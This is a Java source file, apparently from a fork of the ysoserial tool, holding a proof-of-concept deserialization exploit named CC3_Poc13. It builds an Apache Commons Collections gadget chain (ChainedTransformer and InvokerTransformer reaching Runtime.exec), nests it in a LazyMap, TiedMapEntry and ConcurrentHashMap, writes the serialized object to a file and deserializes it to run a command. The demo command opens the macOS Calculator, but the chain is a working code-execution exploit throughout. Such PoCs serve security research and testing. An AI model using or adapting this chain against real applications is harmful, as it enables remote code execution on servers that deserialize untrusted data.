package ysoserial.payloads.tabbyGadgetChains.CommonCollections3;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.util.HashMap;
import java.util.concurrent.ConcurrentHashMap;


//        readObject:1447, ConcurrentHashMap (java.util.concurrent)
//          => hashCode:120, TiedMapEntry (org.apache.commons.collections.keyvalue)
//              => getValue:73, TiedMapEntry (org.apache.commons.collections.keyvalue)
//                  => get:151, LazyMap (org.apache.commons.collections.map)
//                      => transform:122, ChainedTransformer (org.apache.commons.collections.functors)
//                          => transform:124, InvokerTransformer (org.apache.commons.collections.functors)


public class CC3_Poc13 {
    public static void main(String[] args) throws IOException, ClassNotFoundException{
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, new Object[]{"" +
                        "/Applications/Calculator.app/Contents/MacOS/Calculator"})});
        HashMap innermap = new HashMap();
        LazyMap outerMap = (LazyMap)LazyMap.decorate(innermap,chain);
        TiedMapEntry tiedmap = new TiedMapEntry(outerMap,123);

        ConcurrentHashMap concurrentHashMap = new ConcurrentHashMap();
        concurrentHashMap.put(tiedmap,1);

        outerMap.remove(123);
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./ccf31"));
        outputStream.writeObject(concurrentHashMap);
        outputStream.close();
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./ccf31"));
        inputStream.readObject();
    }
}
